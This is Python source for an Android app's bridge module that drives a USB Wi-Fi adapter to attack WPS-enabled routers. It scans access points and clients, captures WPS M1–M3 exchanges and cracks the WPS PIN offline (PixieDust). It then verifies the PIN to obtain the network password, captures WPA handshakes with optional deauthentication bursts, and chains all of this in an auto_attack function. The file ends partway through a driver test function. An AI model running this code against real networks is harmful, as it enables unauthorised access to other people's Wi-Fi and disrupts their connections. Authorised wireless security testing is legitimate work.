"""Pixie Android Python Bridge.

Implements the JSON-safe contract between Kotlin and Chaquopy/wifit3.
All async USB/driver work executes on ONE dedicated persistent asyncio event-loop
thread (`pixie-py-loop`) so locks, AGC tasks, and RxReaderThread callbacks always
share the exact same running loop.
No Python exception crosses into Kotlin: all calls return a dict with ok=True/False.
"""
from __future__ import annotations

import asyncio
import logging
import os
import threading
import time
import traceback
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("PIXIE_SCAN")


class _PyLoopWorker:
    """Owns a single persistent background daemon thread running an asyncio loop."""

    def __init__(self) -> None:
        self._init_lock = threading.Lock()
        self._thread: Optional[threading.Thread] = None
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._ready = threading.Event()

    def ensure_running(self) -> asyncio.AbstractEventLoop:
        with self._init_lock:
            if (
                self._loop is not None
                and not self._loop.is_closed()
                and self._thread is not None
                and self._thread.is_alive()
            ):
                return self._loop

            self._ready.clear()
            self._loop = None

            def _runner() -> None:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                self._loop = loop
                self._ready.set()
                try:
                    loop.run_forever()
                finally:
                    try:
                        pending = asyncio.all_tasks(loop)
                        for task in pending:
                            task.cancel()
                        if pending:
                            loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
                    except Exception:
                        pass
                    loop.close()

            self._thread = threading.Thread(
                target=_runner,
                name="pixie-py-loop",
                daemon=True,
            )
            self._thread.start()
            if not self._ready.wait(timeout=5.0) or self._loop is None:
                raise RuntimeError("Failed to start pixie-py-loop asyncio worker")
            logger.info(
                "PIXIE_SCAN: started persistent asyncio worker thread=%s loop=%s",
                self._thread.ident,
                id(self._loop),
            )
            return self._loop

    def run_coro(self, coro, timeout: Optional[float] = None):
        loop = self.ensure_running()
        if threading.current_thread() is self._thread:
            raise RuntimeError("Re-entrant run_coro on pixie-py-loop thread is forbidden")
        fut = asyncio.run_coroutine_threadsafe(coro, loop)
        try:
            return fut.result(timeout=timeout)
        except Exception:
            if not fut.done():
                fut.cancel()
            raise

    @property
    def thread_id(self) -> Optional[int]:
        return self._thread.ident if self._thread else None

    @property
    def loop_id(self) -> Optional[int]:
        return id(self._loop) if self._loop else None


_WORKER = _PyLoopWorker()
_OP_LOCK = threading.RLock()
_SCAN_CANCEL_EVENT = threading.Event()

# Global active session state (protected by _OP_LOCK)
_active_session = None
_active_session_meta: Dict[str, Any] = {}


def _safe_run(coro, timeout: Optional[float] = None):
    return _WORKER.run_coro(coro, timeout=timeout)


class _BridgeUI:
    """Collects logs and forwards to optional on_log callback and Python logger."""

    def __init__(self, callback: Optional[Callable[[str], None]] = None):
        self.callback = callback
        self.logs: List[str] = []

    def info(self, msg: str):
        self._record("INFO", msg)

    def warn(self, msg: str):
        self._record("WARN", msg)

    def ok(self, msg: str):
        self._record("OK", msg)

    def error(self, msg: str):
        self._record("ERROR", msg)

    def clients(self, snapshot: dict):
        """Streams an airodump-style client snapshot (MAC + RSSI) to the UI.

        These lines are deliberately *not* stored in ``logs``: they arrive every
        ~0.5 s and would bury the operation log.
        """
        if not self.callback:
            return
        try:
            import json as _json
            self.callback("[CLIENTS] " + _json.dumps(snapshot, separators=(",", ":")))
        except Exception as e:
            logger.warning("clients callback error: %s", e)

    def _record(self, level: str, msg: str):
        line = f"[{level}] {msg}"
        self.logs.append(line)
        logger.info("PIXIE_SCAN: %s", line)
        if self.callback:
            try:
                self.callback(line)
            except Exception as e:
                logger.warning("on_log callback error: %s", e)


def _redact_secrets(logs: List[str], pin: Optional[str] = None, psk: Optional[str] = None) -> List[str]:
    out = []
    for line in logs:
        clean = line
        if psk:
            clean = clean.replace(psk, "***")
        if pin:
            clean = clean.replace(pin, "********")
        out.append(clean)
    return out


def _close_active_unlocked() -> None:
    """Tear down active Python session FIRST, then wrapped libusb fd."""
    global _active_session, _active_session_meta
    _SCAN_CANCEL_EVENT.set()
    session = _active_session
    _active_session = None
    _active_session_meta = {}
    if session is not None:
        try:
            _safe_run(session.close(), timeout=5.0)
        except Exception as e:
            logger.warning("PIXIE_SCAN: session.close() error: %s", e)
    try:
        from . import libusb_fd
        libusb_fd.close_fd()
    except Exception as e:
        logger.warning("PIXIE_SCAN: libusb_fd.close_fd() error: %s", e)


def cancel_scan() -> Dict[str, Any]:
    """Signals any active scan loop to exit promptly (thread-safe, non-blocking)."""
    _SCAN_CANCEL_EVENT.set()
    return {"ok": True}


def session_status() -> Dict[str, Any]:
    """Returns diagnostic metadata about the current active Python USB session."""
    with _OP_LOCK:
        from . import libusb_fd
        return {
            "open": _active_session is not None and libusb_fd.STATE.is_open,
            "fd": libusb_fd.STATE.fd,
            "thread_id": _WORKER.thread_id,
            "loop_id": _WORKER.loop_id,
            "meta": dict(_active_session_meta),
        }


def usb_selftest(native_lib_dir: str) -> Dict[str, Any]:
    """Loads the bundled libusb and runs init/exit (no adapter needed)."""
    from . import libusb_fd

    return libusb_fd.probe(native_lib_dir)


def start(
    fd: int,
    vid: int,
    pid: int,
    native_lib_dir: str,
    override: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Brings up the USB adapter with optional driver overrides."""
    global _active_session, _active_session_meta
    with _OP_LOCK:
        _SCAN_CANCEL_EVENT.clear()
        _close_active_unlocked()
        try:
            from . import libusb_fd
            from . import firmware as _android_firmware  # noqa: F401
            import pixie.live as live
            import pixie.thirdparty as thirdparty

            thirdparty.ensure_importable()

            # Reset/apply custom firmware and forced chip env vars cleanly on every start.
            custom_fw = (override or {}).get("firmware_path")
            if custom_fw and os.path.exists(custom_fw):
                os.environ["WIFIT3_CUSTOM_FW"] = custom_fw
            else:
                os.environ.pop("WIFIT3_CUSTOM_FW", None)

            forced_chipset = (override or {}).get("chipset") if override else None
            mode = (override or {}).get("mode") if override else "AUTO"
            os.environ.pop("WIFIT3_FORCE_CHIP", None)

            logger.info(
                "PIXIE_SCAN: bridge.start fd=%s vid=0x%04x pid=0x%04x mode=%s forced=%s",
                fd,
                vid,
                pid,
                mode,
                forced_chipset,
            )

            libusb_fd.install_fd_backend(fd, vid, pid, native_lib_dir)

            from wifit3.device import manager

            claims = manager.supported_ids()
            auto_claim = claims.get((vid, pid))
            auto_chipset = auto_claim.key if auto_claim else None

            if mode == "MANUAL" and forced_chipset:
                if auto_chipset and forced_chipset.lower() != auto_chipset.lower():
                    os.environ["WIFIT3_FORCE_CHIP"] = forced_chipset.lower()

            ui = _BridgeUI()
            session = _safe_run(live.open_session(ui=ui), timeout=20.0)
            _active_session = session
            channels = list(getattr(session.iface, "supported_channels", []) or [])
            chipset = getattr(session.iface, "chipset", None) or auto_chipset or "unknown"
            _active_session_meta = {
                "fd": fd,
                "vid": vid,
                "pid": pid,
                "adapter": session.description,
                "chipset": chipset,
                "channels": channels,
            }
            logger.info(
                "PIXIE_SCAN: adapter started (%s, chipset=%s, loop=%s)",
                session.description,
                chipset,
                _WORKER.loop_id,
            )

            return {
                "ok": True,
                "adapter": session.description,
                "chipset": chipset,
                "vid": vid,
                "pid": pid,
                "channels": channels,
                "error": None,
                "detail": None,
                "suggested": auto_chipset,
                "logs": ui.logs,
            }

        except BaseException as exc:
            tb = traceback.format_exc()
            logger.error("PIXIE_SCAN: start() failed: %s\n%s", exc, tb)
            _close_active_unlocked()
            msg = str(exc)
            error_name = "driver_mismatch" if "mismatch" in msg.lower() else "bringup_failed"
            suggested = None
            try:
                from wifit3.device import manager
                auto_claim = manager.supported_ids().get((vid, pid))
                if auto_claim:
                    suggested = auto_claim.key
            except Exception:
                pass

            return {
                "ok": False,
                "error": error_name,
                "detail": msg,
                "suggested": suggested,
                "traceback": tb,
            }


def close() -> Dict[str, Any]:
    """Closes adapter session and releases wrapped libusb FD (idempotent)."""
    with _OP_LOCK:
        try:
            _close_active_unlocked()
            return {"ok": True, "error": None}
        except BaseException as exc:
            return {"ok": False, "error": str(exc), "traceback": traceback.format_exc()}


def scan(timeout: float = 25.0, include_all: bool = True,
         on_log: Optional[Callable[[str], None]] = None) -> Dict[str, Any]:
    """Scans passively for Wi-Fi access points and returns APs plus RX diagnostics.

    ``on_log`` also receives ``[CLIENTS] {...}`` snapshots every ~0.5 s so the
    UI can show clients (MAC + RSSI) as they join networks, airodump-ng style.
    """
    global _active_session
    with _OP_LOCK:
        if _active_session is None:
            return {
                "ok": False,
                "error": "session_not_open",
                "detail": "Adapter session not open",
                "diagnostic": "session_not_open",
                "aps": [],
                "rx_frames": 0,
                "rx_bursts": 0,
                "beacon_count": 0,
                "callback_errors": 0,
                "channels": [],
                "elapsed_s": 0.0,
            }

        _SCAN_CANCEL_EVENT.clear()
        ui = _BridgeUI(callback=on_log)
        try:
            # Give coroutine timeout generous slack above passive scan window for USB tunes.
            coro_timeout = max(10.0, float(timeout) + 15.0)
            aps = _safe_run(
                _active_session.scan(
                    timeout=timeout,
                    ui=ui,
                    include_all=include_all,
                    cancel_event=_SCAN_CANCEL_EVENT,
                ),
                timeout=coro_timeout,
            )
            stats = dict(getattr(_active_session, "last_scan_stats", {}) or {})
            rx_frames = int(stats.get("raw_packets", 0) or 0)
            rx_bursts = int(stats.get("rx_bursts", 0) or 0)
            beacon_count = int(stats.get("beacon_count", 0) or 0)
            cb_errors = int(stats.get("callback_errors", 0) or 0)
            channels = list(stats.get("channels", []) or [])
            elapsed_s = float(stats.get("elapsed_s", 0.0) or 0.0)

            result_aps = []
            for ap in aps:
                result_aps.append({
                    "bssid": (ap.bssid or "").upper(),
                    "ssid": ap.ssid or "",
                    "channel": int(ap.channel or 0),
                    "rssi": int(ap.rssi if ap.rssi is not None else -100),
                    "encryption": getattr(ap, "encryption", "OPEN") or "OPEN",
                    "wps": bool(ap.wps),
                    "wps_version": getattr(ap, "version", None) or "1.0",
                    "locked": bool(getattr(ap, "locked", False)),
                    "vendor": getattr(ap, "vendor", "") or "",
                    "model": getattr(ap, "model", "") or "",
                    "clients": int(getattr(ap, "clients", 0) or 0),
                })

            if result_aps:
                diagnostic = "ok"
                detail = f"Found {len(result_aps)} APs (beacons={beacon_count}, rx_frames={rx_frames})"
            elif rx_bursts == 0 and rx_frames == 0:
                diagnostic = "zero_raw_frames"
                detail = (
                    f"Zero raw USB/802.11 frames received across {len(channels)} channel(s) "
                    f"in {elapsed_s:.1f}s"
                )
            elif beacon_count == 0:
                diagnostic = "no_valid_beacons"
                detail = (
                    f"Received {rx_bursts} RX burst(s) / {rx_frames} non-beacon frame(s) "
                    f"across {len(channels)} channel(s), but 0 valid beacons decoded "
                    f"(cb_errors={cb_errors})"
                )
            else:
                diagnostic = "scan_empty"
                detail = f"No matching APs kept (beacons={beacon_count}, include_all={include_all})"

            logger.info(
                "PIXIE_SCAN: scan complete diagnostic=%s aps=%d beacons=%d rx_frames=%d bursts=%d cb_err=%d",
                diagnostic,
                len(result_aps),
                beacon_count,
                rx_frames,
                rx_bursts,
                cb_errors,
            )

            return {
                "ok": True,
                "aps": result_aps,
                "rx_frames": rx_frames,
                "rx_bursts": rx_bursts,
                "beacon_count": beacon_count,
                "callback_errors": cb_errors,
                "channels": channels,
                "elapsed_s": elapsed_s,
                "diagnostic": diagnostic,
                "detail": detail,
                "logs": ui.logs,
                "error": None,
            }
        except BaseException as exc:
            tb = traceback.format_exc()
            logger.error("PIXIE_SCAN: scan() exception: %s\n%s", exc, tb)
            return {
                "ok": False,
                "aps": [],
                "rx_frames": 0,
                "rx_bursts": 0,
                "beacon_count": 0,
                "callback_errors": 0,
                "channels": [],
                "elapsed_s": 0.0,
                "diagnostic": "detached" if "detached" in str(exc).lower() else "scan_failed",
                "error": str(exc),
                "detail": str(exc),
                "logs": ui.logs,
                "traceback": tb,
            }


def capture(
    bssid: str,
    ssid: str,
    channel: int,
    timeout: float = 30.0,
    on_log: Optional[Callable[[str], None]] = None,
    channel_source: str = "scan",
) -> Dict[str, Any]:
    """Captures M1..M3 WPS exchange (no M4)."""
    global _active_session
    with _OP_LOCK:
        try:
            if _active_session is None:
                return {"ok": False, "error": "Adapter session not open"}
            if not isinstance(channel, int) or isinstance(channel, bool) or channel < 1 or channel > 14:
                return {
                    "ok": False,
                    "error": f"Unknown or invalid channel ({channel}) for {bssid}; rescan or specify channel 1-14",
                }

            logger.info(
                "PIXIE_SCAN: capture target bssid=%s channel=%d source=%s",
                bssid,
                channel,
                channel_source,
            )

            from pixie.live import AccessPoint

            target_ap = AccessPoint(
                bssid=bssid.lower(),
                ssid=ssid,
                channel=channel,
                wps=True,
            )

            ui = _BridgeUI(callback=on_log)
            ui.info(f"capture target {bssid} on channel {channel} (source: {channel_source})")
            capture_result = _safe_run(
                _active_session.capture(target_ap, timeout=timeout, ui=ui),
                timeout=max(20.0, float(timeout) + 20.0),
            )

            vals = capture_result.values()
            return {
                "ok": True,
                "pke": vals.get("pke", ""),
                "pkr": vals.get("pkr", ""),
                "e_nonce": vals.get("e_nonce", ""),
                "e_hash1": vals.get("e_hash1", ""),
                "e_hash2": vals.get("e_hash2", ""),
                "authkey": vals.get("authkey", ""),
                "enrollee_mac": vals.get("enrollee_mac", ""),
                "notes": capture_result.notes,
                "logs": ui.logs,
                "error": None,
            }
        except BaseException as exc:
            return {"ok": False, "error": str(exc), "traceback": traceback.format_exc()}


def capture_handshake(
    bssid: str,
    ssid: str,
    channel: int,
    timeout: float = 120.0,
    folder: str = "",
    deauth: bool = False,
    deauth_rounds: int = 3,
    max_clients: int = 3,
    max_bursts: int = 4,
    on_log: Optional[Callable[[str], None]] = None,
) -> Dict[str, Any]:
    """Captures one WPA 4-way handshake to a pcap file.

    Monitor RX is continuous; with ``deauth`` the same bounded client deauth burst
    that wifit3's deauth campaign uses is sent to provoke a re-handshake. Every
    transmitted frame is counted in the result.
    """
    global _active_session
    with _OP_LOCK:
        try:
            if _active_session is None:
                return {
                    "ok": False,
                    "complete": False,
                    "valid": False,
                    "valid_pairs": 0,
                    "client_mac": "",
                    "pair": "",
                    "path": "",
                    "frames": 0,
                    "eapol_frames": 0,
                    "messages": [],
                    "clients": 0,
                    "elapsed_s": 0.0,
                    "deauth_sent": 0,
                    "deauth_acked": 0,
                    "deauth_bursts": 0,
                    "notes": [],
                    "error": "Adapter session not open",
                }
            if not isinstance(channel, int) or isinstance(channel, bool) or channel < 1 or channel > 14:
                return {
                    "ok": False,
                    "complete": False,
                    "valid": False,
                    "valid_pairs": 0,
                    "client_mac": "",
                    "pair": "",
                    "path": "",
                    "frames": 0,
                    "eapol_frames": 0,
                    "messages": [],
                    "clients": 0,
                    "elapsed_s": 0.0,
                    "deauth_sent": 0,
                    "deauth_acked": 0,
                    "deauth_bursts": 0,
                    "notes": [],
                    "error": f"Unknown or invalid channel ({channel}) for {bssid}",
                }

            from pixie.live import AccessPoint

            target_ap = AccessPoint(
                bssid=bssid.lower(),
                ssid=ssid,
                channel=channel,
                wps=True,
            )

            _SCAN_CANCEL_EVENT.clear()
            ui = _BridgeUI(callback=on_log)
            logger.info(
                "PIXIE_SCAN: capture_handshake target bssid=%s channel=%d folder=%s deauth=%s",
                bssid,
                channel,
                folder,
                bool(deauth),
            )
            result = _safe_run(
                _active_session.capture_handshake(
                    target_ap,
                    timeout=float(timeout),
                    folder=folder or "",
                    ui=ui,
                    cancel_event=_SCAN_CANCEL_EVENT,
                    deauth=bool(deauth),
                    deauth_rounds=max(1, min(10, int(deauth_rounds))),
                    max_clients=max(1, min(6, int(max_clients))),
                    max_bursts=max(0, min(6, int(max_bursts))),
                ),
                timeout=max(20.0, float(timeout) + 25.0),
            )

            return {
                "ok": True,
                "complete": bool(result.complete),
                "valid": bool(getattr(result, "valid", result.complete)),
                "valid_pairs": int(getattr(result, "valid_pairs", 0) or 0),
                "client_mac": getattr(result, "client_mac", "") or "",
                "pair": getattr(result, "pair", "") or "",
                "path": result.path or "",
                "frames": int(result.frames or 0),
                "eapol_frames": int(result.eapol_frames or 0),
                "messages": [int(m) for m in (result.messages or [])],
                "clients": int(result.clients or 0),
                "elapsed_s": float(result.elapsed_s or 0.0),
                "deauth_sent": int(result.deauth_sent or 0),
                "deauth_acked": int(result.deauth_acked or 0),
                "deauth_bursts": int(result.deauth_bursts or 0),
                "notes": list(result.notes or []),
                "logs": ui.logs,
                "error": None,
            }
        except BaseException as exc:
            tb = traceback.format_exc()
            logger.error("PIXIE_SCAN: capture_handshake() failed: %s\n%s", exc, tb)
            return {
                "ok": False,
                "complete": False,
                "valid": False,
                "valid_pairs": 0,
                "client_mac": "",
                "pair": "",
                "path": "",
                "frames": 0,
                "eapol_frames": 0,
                "messages": [],
                "clients": 0,
                "elapsed_s": 0.0,
                "deauth_sent": 0,
                "deauth_acked": 0,
                "deauth_bursts": 0,
                "notes": [],
                "error": str(exc),
                "traceback": tb,
            }


def crack(
    values: Dict[str, str],
    engine: str = "native",
    modes: Optional[Any] = None,
    deep: bool = False,
) -> Dict[str, Any]:
    """Performs offline PixieDust calculation on captured M1/M3 parameters via pixie.wpscrack."""
    requested_engine = (engine or "native").lower()
    try:
        import pixie.util as util
        import pixie.wpscrack as wpscrack

        raw_map = dict(values or {})
        clean_vals: Dict[str, str] = {}
        for field_name in wpscrack.NATIVE_FIELDS:
            raw_val = raw_map.get(field_name)
            if raw_val is None or (isinstance(raw_val, str) and not raw_val.strip()):
                raise util.PixieError(f"validation: {field_name} is required")
            raw_hex = raw_val if isinstance(raw_val, str) else raw_val.hex()
            clean_vals[field_name] = util.validate_hex(
                raw_hex,
                field_name,
                wpscrack.NATIVE_BYTES[field_name],
            )

        mac_raw = raw_map.get("enrollee_mac") or raw_map.get("bssid")
        if mac_raw:
            mac_str = mac_raw if isinstance(mac_raw, str) else mac_raw.hex()
            if mac_str.strip():
                clean_vals["enrollee_mac"] = util.validate_hex(mac_str, "enrollee_mac", 6)

        if modes is None or (isinstance(modes, (list, tuple, set)) and len(modes) == 0) or (
            isinstance(modes, str) and not modes.strip()
        ):
            resolved_modes = wpscrack.resolve_modes(None, deep=bool(deep))
        elif isinstance(modes, str):
            resolved_modes = wpscrack.resolve_modes(modes, deep=bool(deep))
        else:
            mode_str = ",".join(str(m).strip() for m in modes)
            resolved_modes = wpscrack.resolve_modes(mode_str, deep=bool(deep))

        ui = _BridgeUI()
        outcome = wpscrack.crack(
            clean_vals,
            engine=requested_engine,
            modes=resolved_modes,
            ui=ui,
        )

        pin_str: Optional[str] = None
        if outcome.pin is not None:
            pin_str = str(outcome.pin)
        first_half_str: Optional[str] = None
        if outcome.first_half is not None:
            first_half_str = str(outcome.first_half)

        if pin_str is not None:
            return {
                "ok": True,
                "pin": pin_str,
                "first_half": None,
                "mode": outcome.mode,
                "engine": outcome.engine,
                "seconds": round(float(outcome.seconds), 3),
                "modes_tried": list(outcome.modes_tried),
                "notes": list(outcome.notes),
                "error": None,
                "engine_error": False,
            }

        return {
            "ok": False,
            "pin": None,
            "first_half": first_half_str,
            "mode": outcome.mode,
            "engine": outcome.engine,
            "seconds": round(float(outcome.seconds), 3),
            "modes_tried": list(outcome.modes_tried),
            "notes": list(outcome.notes),
            "error": None,
            "engine_error": False,
        }
    except BaseException as exc:
        tb = traceback.format_exc()
        logger.debug("PIXIE_CRACK: crack() failed: %s\n%s", exc, tb)
        return {
            "ok": False,
            "pin": None,
            "first_half": None,
            "mode": None,
            "engine": requested_engine,
            "seconds": 0.0,
            "notes": [],
            "error": str(exc),
            "traceback": tb,
            "engine_error": True,
        }


def verify(
    bssid: str,
    ssid: str,
    channel: int,
    pin: str,
    channel_source: str = "scan",
    on_log: Optional[Callable[[str], None]] = None,
) -> Dict[str, Any]:
    """Exactly ONE live WPS attempt to verify a recovered PIN and obtain the PSK."""
    global _active_session
    with _OP_LOCK:
        try:
            if _active_session is None:
                return {
                    "ok": False,
                    "attempted": False,
                    "pin_ok": False,
                    "pin": pin,
                    "psk": None,
                    "ssid": ssid,
                    "detail": "Adapter session not open",
                    "status_code": "session_not_open",
                    "config_error": None,
                    "config_error_name": "",
                    "error": "Adapter session not open",
                }
            if not isinstance(channel, int) or isinstance(channel, bool) or channel < 1 or channel > 14:
                msg = f"Unknown or invalid channel ({channel}) for {bssid}; rescan or specify channel 1-14"
                return {
                    "ok": False,
                    "attempted": False,
                    "pin_ok": False,
                    "pin": pin,
                    "psk": None,
                    "ssid": ssid,
                    "detail": msg,
                    "status_code": "invalid_channel",
                    "config_error": None,
                    "config_error_name": "",
                    "error": msg,
                }

            logger.info(
                "PIXIE_SCAN: verify target bssid=%s channel=%d source=%s",
                bssid,
                channel,
                channel_source,
            )

            from pixie.live import AccessPoint

            target_ap = AccessPoint(
                bssid=bssid.lower(),
                ssid=ssid,
                channel=channel,
                wps=True,
            )

            ui = _BridgeUI(callback=on_log)
            ui.info(f"verify target {bssid} on channel {channel} (source: {channel_source})")
            res = _safe_run(_active_session.verify_pin(target_ap, pin=pin, ui=ui), timeout=40.0)
            psk = getattr(res, "psk", None)
            logs = _redact_secrets(ui.logs, pin=pin, psk=psk)

            return {
                "ok": bool(res.ok),
                "pin_ok": bool(getattr(res, "pin_ok", res.ok)),
                "pin": pin,
                "psk": psk,
                "ssid": getattr(res, "ssid", ssid),
                "detail": getattr(res, "detail", ""),
                "status_code": getattr(res, "status_code", "psk_ok" if res.ok else ""),
                "attempted": bool(getattr(res, "attempted", True)),
                "config_error": getattr(res, "config_error", None),
                "config_error_name": getattr(res, "config_error_name", ""),
                "flow": getattr(res, "flow", "verify_only"),
                "reached_m1": bool(getattr(res, "reached_m1", False)),
                "identity_reqs": int(getattr(res, "identity_reqs", 0)),
                "eapol_resends": int(getattr(res, "eapol_resends", 0)),
                "ack_failures": int(getattr(res, "ack_failures", 0)),
                "stage": getattr(res, "stage", "assoc"),
                "had_encrypted_settings": bool(getattr(res, "had_encrypted_settings", False)),
                "decrypt_ok": getattr(res, "decrypt_ok", None),
                "m4_sent": bool(getattr(res, "m4_sent", False)),
                "assoc_count": int(getattr(res, "assoc_count", 1)),
                "logs": logs,
                "error": None,
            }
        except BaseException as exc:
            return {
                "ok": False,
                "attempted": False,
                "pin_ok": False,
                "pin": pin,
                "psk": None,
                "ssid": ssid,
                "detail": str(exc),
                "status_code": "internal_error",
                "config_error": None,
                "config_error_name": "",
                "error": str(exc),
                "traceback": traceback.format_exc(),
            }


def auto_attack(
    bssid: str,
    ssid: str,
    channel: int,
    modes: Optional[Any] = None,
    deep: bool = False,
    engine: str = "native",
    timeout: float = 35.0,
    on_log: Optional[Callable[[str], None]] = None,
    channel_source: str = "scan",
    auto_verify: bool = True,
) -> Dict[str, Any]:
    """Automatic end-to-end PixieDust: capture M1-M3 -> offline PIN -> single M4-M7 PSK."""
    global _active_session
    requested_engine = (engine or "native").lower()
    ui = _BridgeUI(callback=on_log)
    with _OP_LOCK:
        try:
            if _active_session is None:
                return {
                    "ok": False,
                    "pin_recovered": False,
                    "pin": None,
                    "status_code": "session_not_open",
                    "detail": "Adapter session not open",
                    "error": "Adapter session not open",
                    "engine_error": False,
                    "logs": ui.logs,
                }
            if not isinstance(channel, int) or isinstance(channel, bool) or channel < 1 or channel > 14:
                msg = f"Unknown or invalid channel ({channel}) for {bssid}; rescan or specify channel 1-14"
                return {
                    "ok": False,
                    "pin_recovered": False,
                    "pin": None,
                    "status_code": "invalid_channel",
                    "detail": msg,
                    "error": msg,
                    "engine_error": False,
                    "logs": ui.logs,
                }

            import pixie.wpscrack as wpscrack
            from pixie.live import AccessPoint

            if (
                modes is None
                or (isinstance(modes, (list, tuple, set)) and len(modes) == 0)
                or (isinstance(modes, str) and not modes.strip())
            ):
                resolved_modes = wpscrack.resolve_modes(None, deep=bool(deep))
            elif isinstance(modes, str):
                resolved_modes = wpscrack.resolve_modes(modes, deep=bool(deep))
            else:
                mode_str = ",".join(str(m).strip() for m in modes)
                resolved_modes = wpscrack.resolve_modes(mode_str, deep=bool(deep))

            logger.info(
                "PIXIE_SCAN: auto_attack target bssid=%s channel=%d source=%s auto_verify=%s",
                bssid,
                channel,
                channel_source,
                bool(auto_verify),
            )
            ui.info(f"auto_attack target {bssid} on channel {channel} (source: {channel_source})")

            target_ap = AccessPoint(
                bssid=bssid.lower(),
                ssid=ssid,
                channel=channel,
                wps=True,
            )

            coro_timeout = max(95.0, float(timeout) + 60.0) if auto_verify else max(25.0, float(timeout) + 20.0)
            res = _safe_run(
                _active_session.auto_pin_to_psk(
                    target_ap,
                    modes=resolved_modes,
                    deep=bool(deep),
                    engine=requested_engine,
                    auto_verify=bool(auto_verify),
                    capture_timeout=float(timeout),
                    ui=ui,
                ),
                timeout=coro_timeout,
            )

            crack = dict(res.crack or {})
            verify_res = res.verify
            psk = getattr(verify_res, "psk", None)
            cap_vals = res.capture.values() if res.capture is not None else None
            cap_notes = list(res.capture.notes) if res.capture is not None else []
            pin_val = crack.get("pin")
            if pin_val is not None:
                pin_val = str(pin_val)
            logs = _redact_secrets(ui.logs, pin=pin_val, psk=psk)

            verify_dict = {
                "attempted": bool(verify_res.attempted),
                "ok": bool(verify_res.ok),
                "pin_ok": bool(getattr(verify_res, "pin_ok", verify_res.ok)),
                "pin": str(verify_res.pin or pin_val or ""),
                "psk": psk,
                "ssid": verify_res.ssid or ssid,
                "detail": verify_res.detail,
                "status_code": verify_res.status_code or res.status_code,
                "config_error": verify_res.config_error,
                "config_error_name": getattr(verify_res, "config_error_name", ""),
                "flow": verify_res.flow,
                "reached_m1": bool(verify_res.reached_m1),
                "identity_reqs": int(verify_res.identity_reqs),
                "eapol_resends": int(verify_res.eapol_resends),
                "ack_failures": int(verify_res.ack_failures),
                "stage": verify_res.stage,
                "had_encrypted_settings": bool(verify_res.had_encrypted_settings),
                "decrypt_ok": verify_res.decrypt_ok,
                "m4_sent": bool(verify_res.m4_sent),
                "assoc_count": int(verify_res.assoc_count),
            }

            return {
                "ok": bool(verify_res.ok) if auto_verify else bool(res.pin_recovered),
                "pin_recovered": bool(res.pin_recovered),
                "pin": pin_val,
                "first_half": crack.get("first_half"),
                "mode": crack.get("mode"),
                "engine": crack.get("engine", requested_engine),
                "seconds": round(float(crack.get("seconds", 0.0) or 0.0), 3),
                "modes_tried": list(crack.get("modes_tried") or resolved_modes),
                "notes": list(crack.get("notes") or []),
                "engine_error": False,
                "capture": cap_vals,
                "capture_notes": cap_notes,
                "verify": verify_dict,
                "status_code": res.status_code,
                "flow": res.flow,
                "assoc_count": int(res.assoc_count),
                "detail": res.detail,
                "logs": logs,
                "error": None,
            }
        except BaseException as exc:
            tb = traceback.format_exc()
            logger.error("PIXIE_SCAN: auto_attack() exception: %s\n%s", exc, tb)
            msg = str(exc)
            lower = msg.lower()
            status = "internal_error"
            if "no m1" in lower or "no reply to m1" in lower:
                status = "no_m1"
            elif "locked" in lower:
                status = "locked"
            elif "association" in lower:
                status = "assoc_failed"
            elif "timeout" in lower:
                status = "timeout"
            return {
                "ok": False,
                "pin_recovered": False,
                "pin": None,
                "first_half": None,
                "mode": None,
                "engine": requested_engine,
                "seconds": 0.0,
                "modes_tried": [],
                "notes": [],
                "engine_error": False,
                "capture": None,
                "capture_notes": [],
                "verify": {
                    "attempted": False,
                    "ok": False,
                    "pin_ok": False,
                    "pin": "",
                    "psk": None,
                    "ssid": ssid,
                    "detail": msg,
                    "status_code": status,
                    "config_error": None,
                    "config_error_name": "",
                    "flow": "none",
                    "reached_m1": False,
                    "identity_reqs": 0,
                    "eapol_resends": 0,
                    "ack_failures": 0,
                    "stage": "assoc",
                    "had_encrypted_settings": False,
                    "decrypt_ok": None,
                    "m4_sent": False,
                    "assoc_count": 0,
                },
                "status_code": status,
                "flow": "none",
                "assoc_count": 0,
                "detail": msg,
                "logs": ui.logs,
                "error": msg,
                "traceback": tb,
            }


async def _passive_rx_probe(iface, channel: int = 6, duration_s: float = 1.2) -> Dict[str, int]:
    """Tunes passively to one channel without TX and counts RX bursts, packets, and beacons."""
    from wifit3.dot11.packet import BeaconPacket

    counts = {"rx_bursts": 0, "raw_packets": 0, "beacons": 0}

    def _on_pkt(pkt):
        counts["raw_packets"] += 1
        if isinstance(pkt, BeaconPacket):
            counts["beacons"] += 1

    reader = getattr(getattr(iface, "driver", None), "_reader", None)
    bursts_before = int(getattr(reader, "_bufs_consumed", 0) or 0) if reader else 0
    iface.register_rx_callback(_on_pkt)
    try:
        await iface.set_channel(channel, scan=True)
        await asyncio.sleep(max(0.2, duration_s))
    finally:
        iface.unregister_rx_callback(_on_pkt)
        bursts_after = int(getattr(reader, "_bufs_consumed", 0) or 0) if reader else 0
        counts["rx_bursts"] = max(0, bursts_after - bursts_before)
    return counts


def test_driver(
    fd: int,
    vid: int,
    pid: int,
    native_lib_dir: str,
    override: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Dry-run driver bringup + passive RX check (no TX) and clean teardown."""
    steps: List[Dict[str, Any]] = []
    iface = None
    with _OP_LOCK:
        _close_active_unlocked()
        try:
            from . import libusb_fd
            import pixie.thirdparty as thirdparty

            thirdparty.ensure_importable()

            # Step 1: Wrap USB FD
            try:
                libusb_fd.install_fd_backend(fd, vid, pid, native_lib_dir)
                steps.append({"name": "Wrap USB file descriptor", "ok": True, "detail": f"FD {fd} wrapped"})
            except Exception as e:
                steps.append({"name": "Wrap USB file descriptor", "ok": False, "detail": str(e)})
                return {"ok": False, "steps": steps, "error": str(e)}

            # Step 2: Identify Chipset & Driver
            from wifit3.device import manager

            try:
                claims = manager.supported_ids()
                claim = claims.get((vid, pid))
                chip_name = claim.key if claim else f"0x{vid:04x}:0x{pid:04x}"
                if override and override.get("chipset"):
                    chip_name = override["chipset"]
                steps.append({"name": "Match driver for VID:PID", "ok": True, "detail": f"Chipset: {chip_name}"})
            except Exception as e:
                steps.append({"name": "Match driver for VID:PID", "ok": False, "detail": str(e)})
                return {"ok": False, "steps": steps, "error": str(e)}

